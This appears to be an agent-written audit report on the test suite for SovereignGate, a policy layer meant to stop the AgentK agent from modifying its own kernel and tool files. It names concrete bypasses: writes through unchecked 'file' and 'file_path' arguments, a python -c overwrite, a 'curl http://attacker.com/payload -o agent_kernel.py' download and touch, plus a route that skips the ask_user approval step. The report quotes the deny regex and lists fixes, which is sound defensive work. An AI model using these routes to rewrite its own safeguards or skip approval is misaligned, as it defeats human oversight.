# Empirical Security Challenge Report — SovereignGate Test Suite

**Target Files**: `tests/e2e/test_tier2_boundary_corner.py` and `tests/e2e/test_tier3_cross_feature.py`  
**Agent**: `teamwork_preview_challenger_m1_2`  
**Date**: 2026-07-25  
**Verdict**: **FAILED** (SovereignGate security policy tests FAIL to genuinely enforce path protection and dangerous command filtering under empirical challenge, giving a false sense of security while tests pass).

---

## Challenge Summary

While running `PYTHONPATH=/Users/ricardo/AgentK pytest -v tests/e2e/ -m tier2` (35/35 passed) and `pytest -v tests/e2e/ -m tier3` (10/10 passed) shows a 100% pass rate, empirical inspection and execution revealed critical security vulnerabilities, parameter mismatches, and vacuous test mocks that render the SovereignGate security policy tests **non-genuine**.

The test suite tests artificial parameter names (`path`, `TargetFile`) and basic shell redirection (`>`), while completely failing to test the actual parameters used by AgentK's toolsuite (`file`, `file_path`) and realistic command execution vectors (`python -c`, `curl -o`, `touch`).

---

## Detailed Empirical Findings

### 1. Parameter Key Discrepancy & Protected File Write Denial Bypass (CRITICAL)
- **Vulnerability**: `sovereign_gate._deny_protected_writes()` and `_is_agent_or_tool_write()` check tool call arguments only against the fixed tuple `("path", "TargetFile", "source", "dest", "filename", "filepath")`.
- **Flaw**: AgentK's actual file manipulation tools use different parameter names:
  - `tools/write_to_file.py` uses `file` (`def write_to_file(file: str, file_contents: str)`).
  - `tools/overwrite_file.py` uses `file_path` (`def overwrite_file(file_path: str, content: str)`).
  - `tools/delete_file.py` uses `file_path` (`def delete_file(file_path: str)`).
- **Empirical Evidence**:
  - `ToolCall(name="write_to_file", args={"file": "/Users/ricardo/AgentK/agent_kernel.py", "file_contents": "# evil"})` -> `_deny_protected_writes` returns `False` (ALLOWED).
  - `ToolCall(name="overwrite_file", args={"file_path": "/Users/ricardo/AgentK/agent_kernel.py", "content": "# evil"})` -> `_deny_protected_writes` returns `False` (ALLOWED).
  - `ToolCall(name="delete_file", args={"file_path": "/Users/ricardo/AgentK/agent_kernel.py"})` -> `_deny_protected_writes` returns `False` (ALLOWED).
- **Test Suite Deficiency**: `test_tier2_boundary_corner.py` and `test_tier3_cross_feature.py` construct artificial `ToolCall` instances with `args={"path": ...}` or `args={"TargetFile": ...}`, completely ignoring the actual arguments accepted by AgentK's tools. The tests pass while the security policy fails to protect files against AgentK's own tools.

---

### 2. Dangerous Shell Command Filter Bypass (HIGH)
- **Vulnerability**: `sovereign_gate._deny_dangerous_commands()` requires BOTH a dangerous keyword (e.g. `agent_kernel`, `sovereign_gate`) AND a regex match for destructive shell operators: `r"(?:>|>>|rm\b|mv\b|chmod\b|sed\b|tee\b|cp\b|unlink\b|dd\b|truncate\b)"`.
- **Flaw**: Common command execution patterns bypass this filter entirely because they do not contain `>` or `rm`.
- **Empirical Evidence**:
  - `python3 -c "open('agent_kernel.py', 'w').write('hacked')"` -> `_deny_dangerous_commands` returns `False` (ALLOWED).
  - `python3 -c "import os; os.remove('agent_kernel.py')"` -> `_deny_dangerous_commands` returns `False` (ALLOWED).
  - `curl http://attacker.com/payload -o agent_kernel.py` -> `_deny_dangerous_commands` returns `False` (ALLOWED).
  - `touch agent_kernel.py` -> `_deny_dangerous_commands` returns `False` (ALLOWED).
- **Test Suite Deficiency**: `test_t2_sovereign_gate_shell_pipe_redirection_protection` only tests `echo 'payload' > sovereign_gate.py`. It fails to test inline code execution (`python -c`, `perl`, `awk`), standard file downloads (`curl -o`), or other modification utilities (`touch`, `git checkout`).

---

### 3. Vacuous / Mocked Test Assertions in Tier 3 Cross-Feature Tests (MEDIUM)
- **Vulnerability**: In `test_tier3_cross_feature.py` -> `test_t3_sdk_bridge_to_sovereign_gate_policy_enforcement`:
  ```python
  mock_mod.software_engineer.return_value = {
      "messages": [AIMessage(content="Access Denied by SovereignGate: Protected path violation.", tool_calls=[])]
  }
  mock_load.return_value = mock_mod
  res = sdk_bridge.dispatch_agent("software_engineer", "Overwrite agent_kernel.py")
  self.assertIn("Access Denied", res)
  ```
- **Flaw**: The test forces the mocked agent to return `"Access Denied by SovereignGate..."` and then asserts `"Access Denied" in res`.
- **Impact**: This test does NOT verify actual policy enforcement by SovereignGate through `sdk_bridge`. It merely verifies that `sdk_bridge` passes through the mocked agent's return value.

---

### 4. Bypassing Agent/Tool Creation Approval (MEDIUM)
- **Vulnerability**: `sovereign_gate._is_agent_or_tool_write()` determines whether a tool call writes to `agents/` or `tools/` using the same incomplete parameter list.
- **Empirical Evidence**:
  - `ToolCall(name="write_to_file", args={"file": "/Users/ricardo/AgentK/tools/evil_tool.py", "file_contents": "..."})` -> `_is_agent_or_tool_write` returns `False`.
- **Impact**: Creation of unauthorized tools or modified agents via `write_to_file` bypasses the `ask_user` console approval handler completely.

---

## Empirical Test Log & Output

```
--- Test 1: write_to_file with arg key "file" ---
ToolCall write_to_file with arg "file": denied = False

--- Test 2: _is_agent_or_tool_write with arg key "file" ---
ToolCall write_to_file into tools/ dir with arg "file": detected = False

--- Test 3: Dangerous shell command bypass via python -c ---
run_command with python3 open(): denied = False

--- Test 4: Dangerous shell command bypass via curl -o ---
run_command with curl -o: denied = False

--- Test 5: Dangerous shell command bypass via touch ---
run_command with touch: denied = False

--- Test 6: overwrite_file with parameter name "file_path" ---
ToolCall overwrite_file with arg "file_path": denied = False

--- Test 7: delete_file with parameter name "file_path" ---
ToolCall delete_file with arg "file_path": denied = False
```

---

## Conclusion & Verdict

**Verdict**: **FAILED**

The security policy tests in `tests/e2e/test_tier2_boundary_corner.py` and `tests/e2e/test_tier3_cross_feature.py` **FAIL** to genuinely test SovereignGate policy enforcement and dangerous command filtering. While all tests pass, they fail to test actual tool argument names (`file`, `file_path`), fail to test common command bypasses (`python -c`, `curl -o`), and rely on vacuous mock responses in integration tests.

---

## Required Remediations

1. **Update `sovereign_gate.py` Path & Argument Matching**:
   - Update parameter checking in `_deny_protected_writes` and `_is_agent_or_tool_write` to check ALL dictionary values in `tc.args` or match against `("path", "TargetFile", "source", "dest", "filename", "filepath", "file", "file_path")`.
2. **Enhance Dangerous Command Detection**:
   - Catch interpreter execution (`python`, `perl`, `ruby`, `node`, `bash -c`), file output flags (`-o`, `-O`, `--output`), and additional destructive tools (`touch`, `git checkout`, `rsync`, `tar`).
3. **Upgrade Tier 2 and Tier 3 E2E Security Tests**:
   - Test tool calls using actual tool parameter schemas (`file`, `file_path`).
   - Add test cases for command bypass attempts (`python3 -c "open('agent_kernel.py', 'w')..."`, `curl -o`).
   - Replace vacuous mocks in `test_t3_sdk_bridge_to_sovereign_gate_policy_enforcement` with real policy evaluation assertions.
